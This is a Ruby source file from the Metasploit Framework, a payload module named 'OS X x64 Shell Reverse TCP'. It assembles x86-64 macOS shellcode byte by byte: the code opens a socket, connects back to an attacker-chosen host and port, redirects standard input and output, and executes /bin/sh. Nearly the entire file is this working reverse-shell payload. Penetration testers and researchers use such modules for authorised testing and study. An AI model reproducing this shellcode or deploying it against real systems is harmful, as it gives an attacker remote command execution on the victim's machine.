##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Single
  include Msf::Payload::Osx
  include Msf::Sessions::CommandShellOptions

  handler module_name: 'Msf::Handler::ReverseTcp'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'OS X x64 Shell Reverse TCP',
      'Description'   => 'Connect back to attacker and spawn a command shell',
      'Author'        => 'nemo <nemo[at]felinemenace.org>',
      'License'       => MSF_LICENSE,
      'Platform'      => 'osx',
      'Arch'          => ARCH_X86_64,
      'Session'       => Msf::Sessions::CommandShellUnix
    ))

    # exec payload options

    register_options(
      [
        OptString.new('CMD',   [ true,  "The command string to execute", "/bin/sh" ]),
        Opt::LHOST,
        Opt::LPORT(4444)
    ], self.class)
  end

  # build the shellcode payload dynamically based on the user-provided CMD
  def generate
    lhost = datastore['LHOST'] || '127.0.0.1'
    # OptAddress allows either an IP or hostname, we only want IPv4
    if not Rex::Socket.is_ipv4?(lhost)
      raise ArgumentError, "LHOST must be in IPv4 format."
    end

    cmd  = (datastore['CMD'] || '') << "\x00"
    port = [datastore['LPORT'].to_i].pack('n')
    ipaddr = [lhost.split('.').inject(0) {|t,v| (t << 8 ) + v.to_i}].pack("N")

    call = "\xe8" + [cmd.length].pack('V')
    payload =
      "\xB8\x61\x00\x00\x02" +                     # mov eax,0x2000061
      "\x6A\x02" +                                 # push byte +0x2
      "\x5F" +                                     # pop rdi
      "\x6A\x01" +                                 # push byte +0x1
      "\x5E" +                                     # pop rsi
      "\x48\x31\xD2" +                             # xor rdx,rdx
      "\x0F\x05" +                                 # loadall286
      "\x49\x89\xC4" +                             # mov r12,rax
      "\x48\x89\xC7" +                             # mov rdi,rax
      "\xB8\x62\x00\x00\x02" +                     # mov eax,0x2000062
      "\x48\x31\xF6" +                             # xor rsi,rsi
      "\x56" +                                     # push rsi
      "\x48\xBE\x00\x02" + port +                  # mov rsi,0x100007fb3150200
      ipaddr +
      "\x56" +                                     # push rsi
      "\x48\x89\xE6" +                             # mov rsi,rsp
      "\x6A\x10" +                                 # push byte +0x10
      "\x5A" +                                     # pop rdx
      "\x0F\x05" +                                 # loadall286
      "\x4C\x89\xE7" +                             # mov rdi,r12
      "\xB8\x5A\x00\x00\x02" +                     # mov eax,0x200005a
      "\x48\x31\xF6" +                             # xor rsi,rsi
      "\x0F\x05" +                                 # loadall286
      "\xB8\x5A\x00\x00\x02" +                     # mov eax,0x200005a
      "\x48\xFF\xC6" +                             # inc rsi
      "\x0F\x05" +                                 # loadall286
      "\x48\x31\xC0" +                             # xor rax,rax
      "\xB8\x3B\x00\x00\x02" +                     # mov eax,0x200003b
      call +                                       # call CMD.len
      cmd +                                        # CMD
      "\x48\x8B\x3C\x24" +                         # mov rdi,[rsp]
      "\x48\x31\xD2" +                             # xor rdx,rdx
      "\x52" +                                     # push rdx
      "\x57" +                                     # push rdi
      "\x48\x89\xE6" +                             # mov rsi,rsp
      "\x0F\x05"                                   # loadall286
  end
end
